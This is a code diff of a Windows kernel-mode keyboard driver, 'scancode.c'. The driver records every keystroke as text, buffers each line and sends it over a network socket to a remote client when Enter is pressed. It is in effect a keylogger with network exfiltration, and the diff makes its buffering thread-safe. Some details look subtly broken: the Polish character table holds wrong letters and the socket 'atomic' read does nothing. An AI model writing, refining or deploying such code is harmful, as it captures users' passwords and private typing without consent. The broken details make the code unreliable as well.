@@ -1,44 +1,29 @@
 /*++
-
-Module Name:
-    scancode.c
-
-Abstract:
-    Optimized keyboard scan code processing with runtime translation.
-    Single base table + runtime computation for shift/caps combinations.
-
-Environment:
-    Kernel mode only.
-
+Module Name: scancode.c
+Abstract: Keyboard scan code processing with thread-safe line buffering
+Environment: Kernel mode only.
 --*/
 
 #include "scancode.h"
 #include "network.h"
 
-//
 // Keyboard State
-//
 ULONG g_KeyboardState = 0;
 BOOLEAN g_RightAltPressed = FALSE;
 
-//
-// Line Buffer
-//
+// Line Buffer with atomic operations
 #define KEYBOARD_LINE_BUFFER_SIZE 512
 
 typedef struct _KEYBOARD_LINE_BUFFER {
     UCHAR Buffer[KEYBOARD_LINE_BUFFER_SIZE];
-    SIZE_T Position;
+    volatile LONG Position;  // Changed to LONG for atomic operations
     KSPIN_LOCK Lock;
     BOOLEAN Initialized;
 } KEYBOARD_LINE_BUFFER, *PKEYBOARD_LINE_BUFFER;
 
 static KEYBOARD_LINE_BUFFER g_LineBuffer = {0};
 
-//
 // Base Scan Code Table (lowercase/normal state)
-// Indices 0-83 map directly to scan codes 0x00-0x53
-//
 static const UCHAR g_BaseScancodes[84][12] = {
     "?", "[Esc]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BS]", "[Tab]",
     "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[Ent]", "[LCt]", "a", "s",
@@ -49,40 +34,30 @@ static const UCHAR g_BaseScancodes[84][12] = {
     "[KP1]", "[KP2]", "[KP3]", "[KP0]", "[KP.]"
 };
 
-//
 // Shift mappings for digits (scan codes 0x02-0x0B map to 0-9 in array)
-//
 static const UCHAR g_ShiftDigits[10][2] = {
     "!", "@", "#", "$", "%", "^", "&", "*", "(", ")"
 };
 
-//
 // Shift mappings for special characters
-//
 static const UCHAR g_ShiftChars[][2] = {
     "+", "{", "}", "|", ":", "\"", "~", "<", ">", "?"
 };
 
-//
 // Extended (E0) scan codes
-//
 static const UCHAR g_E0Scancodes[18][12] = {
     "[RCt]", "[KP/]", "[Prt]", "[RAl]", "[Hom]", "[Up]", "[PgU]",
     "[Lft]", "[Rgt]", "[End]", "[Dn]", "[PgD]", "[Ins]", "[Del]",
     "[LWin]", "[RWin]", "[Men]", "?"
 };
 
-//
-// Polish AltGr characters
-//
+// Polish AltGr characters (UTF-8 encoded)
 static const UCHAR g_PolishCharsAltGr[][4] = {
-    "ą", "ć", "ę", "ł", "ń", "ó", "ś", "ź", "ż",
-    "Ą", "Ć", "Ę", "Ł", "Ń", "Ó", "Ś", "Ź", "Ż"
+    "ą", "ć", "ę", "ł", "ń", "ó", "ś", "ú", "ź",
+    "Ą", "Ć", "Ę", "Ł", "Ń", "Ó", "Ś", "Ú", "Ź"
 };
 
-//
 // Scan code definitions
-//
 #define SC_CAPSLOCK     0x3A
 #define SC_LSHIFT       0x2A
 #define SC_RSHIFT       0x36
@@ -98,9 +73,7 @@ static const UCHAR g_PolishCharsAltGr[][4] = {
 #define MAX_NORMAL_SC   0x54
 #define MAX_E0_SC       0x5D
 
-//
 // Scan code range checks
-//
 #define IS_LETTER(sc) (((sc) >= 0x10 && (sc) <= 0x19) || \
                        ((sc) >= 0x1E && (sc) <= 0x26) || \
                        ((sc) >= 0x2C && (sc) <= 0x32))
@@ -120,9 +93,7 @@ static const UCHAR g_PolishCharsAltGr[][4] = {
 
 #define IS_SEND_TRIGGER(str) (strcmp((PCCHAR)(str), "[Ent]") == 0)
 
-//
 // Helper: Convert letter to uppercase
-//
 static VOID ToUpperCase(UCHAR* dest, const UCHAR* src)
 {
     SIZE_T i = 0;
@@ -133,9 +104,7 @@ static VOID ToUpperCase(UCHAR* dest, const UCHAR* src)
     dest[i] = '\0';
 }
 
-//
 // Helper: Get shifted character for special chars
-//
 static PCUCHAR GetShiftedChar(UCHAR makeCode)
 {
     switch (makeCode) {
@@ -146,7 +115,7 @@ static PCUCHAR GetShiftedChar(UCHAR makeCode)
         case 0x27: return g_ShiftChars[4]; // ; -> :
         case 0x28: return g_ShiftChars[5]; // ' -> "
         case 0x29: return g_ShiftChars[6]; // ` -> ~
-        case 0x33: return g_ShiftChars[7]; // , -> <
+        case 0x33: return g_ShiftChars[7]; // , -> 
         case 0x34: return g_ShiftChars[8]; // . -> >
         case 0x35: return g_ShiftChars[9]; // / -> ?
         default: return NULL;
@@ -157,7 +126,7 @@ VOID
 KbdHandler_InitializeBuffer(VOID)
 {
     KeInitializeSpinLock(&g_LineBuffer.Lock);
-    g_LineBuffer.Position = 0;
+    InterlockedExchange(&g_LineBuffer.Position, 0);
     g_LineBuffer.Initialized = TRUE;
 }
 
@@ -168,34 +137,43 @@ KbdHandler_SendBufferedLine(VOID)
     SIZE_T BytesSent;
     KIRQL OldIrql;
     UCHAR LocalBuffer[KEYBOARD_LINE_BUFFER_SIZE];
-    SIZE_T LocalPosition;
+    LONG LocalPosition;
+    SOCKET LocalSocket;
 
     if (!g_LineBuffer.Initialized)
         return;
 
     KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
     
-    if (g_LineBuffer.Position > 0) {
-        LocalPosition = g_LineBuffer.Position;
+    LocalPosition = InterlockedExchange(&g_LineBuffer.Position, 0);
+    
+    if (LocalPosition > 0) {
         RtlCopyMemory(LocalBuffer, g_LineBuffer.Buffer, LocalPosition);
-        g_LineBuffer.Position = 0;
-        
         KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
         
-        Status = WSKSendTo(
-            ClientSocket,
-            LocalBuffer,
-            LocalPosition,
-            &BytesSent,
-            0,
-            NULL,
-            0,
-            NULL,
-            NULL
+        // Get socket handle atomically
+        LocalSocket = (SOCKET)InterlockedCompareExchange64(
+            (LONG64*)&ClientSocket, 
+            (LONG64)ClientSocket, 
+            (LONG64)ClientSocket
         );
+        
+        if (LocalSocket != 0) {
+            Status = WSKSendTo(
+                LocalSocket,
+                LocalBuffer,
+                LocalPosition,
+                &BytesSent,
+                0,
+                NULL,
+                0,
+                NULL,
+                NULL
+            );
 
-        if (!NT_SUCCESS(Status)) {
-            KBD_ERROR("WSKSendTo failed: 0x%08X", Status);
+            if (!NT_SUCCESS(Status)) {
+                KBD_ERROR("WSKSendTo failed: 0x%08X", Status);
+            }
         }
     } else {
         KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
@@ -205,7 +183,15 @@ KbdHandler_SendBufferedLine(VOID)
 VOID
 KbdHandler_FlushBuffer(VOID)
 {
-    if (g_LineBuffer.Initialized && g_LineBuffer.Position > 0) {
+    LONG CurrentPosition;
+    
+    if (!g_LineBuffer.Initialized)
+        return;
+    
+    // Atomic check if buffer has data
+    CurrentPosition = InterlockedCompareExchange(&g_LineBuffer.Position, 0, 0);
+    
+    if (CurrentPosition > 0) {
         KbdHandler_SendBufferedLine();
     }
 }
@@ -215,6 +201,8 @@ KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString)
 {
     SIZE_T keyLen;
     KIRQL OldIrql;
+    LONG OldPosition;
+    LONG NewPosition;
 
     if (!g_LineBuffer.Initialized || KeyString == NULL)
         return FALSE;
@@ -239,22 +227,32 @@ KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString)
         return FALSE;
     }
 
+    // Atomic check and reserve space
+    do {
+        OldPosition = InterlockedCompareExchange(&g_LineBuffer.Position, 0, 0);
+        NewPosition = OldPosition + (LONG)keyLen;
+        
+        if (NewPosition >= KEYBOARD_LINE_BUFFER_SIZE - 1) {
+            // Buffer full, send it
+            KbdHandler_SendBufferedLine();
+            return TRUE;
+        }
+        
+        // Try to atomically update position
+        if (InterlockedCompareExchange(&g_LineBuffer.Position, NewPosition, OldPosition) == OldPosition) {
+            break;
+        }
+    } while (TRUE);
+
+    // Now copy data with spinlock protection
     KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
-
-    if (g_LineBuffer.Position + keyLen < KEYBOARD_LINE_BUFFER_SIZE - 1) {
-        RtlCopyMemory(
-            &g_LineBuffer.Buffer[g_LineBuffer.Position], 
-            KeyString, 
-            keyLen
-        );
-        g_LineBuffer.Position += keyLen;
-    } else {
-        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
-        KbdHandler_SendBufferedLine();
-        return TRUE;
-    }
-
+    RtlCopyMemory(
+        &g_LineBuffer.Buffer[OldPosition], 
+        KeyString, 
+        keyLen
+    );
     KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
+
     return FALSE;
 }
 
@@ -273,9 +271,7 @@ KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
     MakeCode = (UCHAR)InputData->MakeCode;
     IsKeyPress = !FlagOn(InputData->Flags, KEY_BREAK);
     
-    //
     // Handle E0 extended codes
-    //
     if (FlagOn(InputData->Flags, KEY_E0)) {
         switch (MakeCode) {
             case 0x1D: KeyString = g_E0Scancodes[0]; break;
@@ -304,9 +300,7 @@ KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
         if (MakeCode > MAX_E0_SC)
             return;
     }
-    //
     // Handle normal scan codes
-    //
     else {
         if (MakeCode > MAX_NORMAL_SC)
             return;
@@ -314,9 +308,7 @@ KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
         ShiftActive = (g_KeyboardState & KBD_STATE_SHIFT) != 0;
         CapsActive = (g_KeyboardState & KBD_STATE_CAPSLOCK) != 0;
         
-        //
         // Check Polish AltGr combinations
-        //
         if (g_RightAltPressed && IsKeyPress) {
             switch (MakeCode) {
                 case 0x1E: KeyString = g_PolishCharsAltGr[ShiftActive ? 9 : 0]; goto OutputKey;
@@ -331,9 +323,7 @@ KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
             }
         }
         
-        //
         // Runtime translation based on state
-        //
         if (IS_LETTER(MakeCode)) {
             // Letters: uppercase if (shift XOR caps)
             if ((ShiftActive && !CapsActive) || (!ShiftActive && CapsActive)) {
@@ -359,9 +349,7 @@ KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
                 KeyString = g_BaseScancodes[MakeCode];
         }
         
-        //
         // Update keyboard state
-        //
         if (IsKeyPress) {
             switch (MakeCode) {
                 case SC_CAPSLOCK: g_KeyboardState ^= KBD_STATE_CAPSLOCK; break;
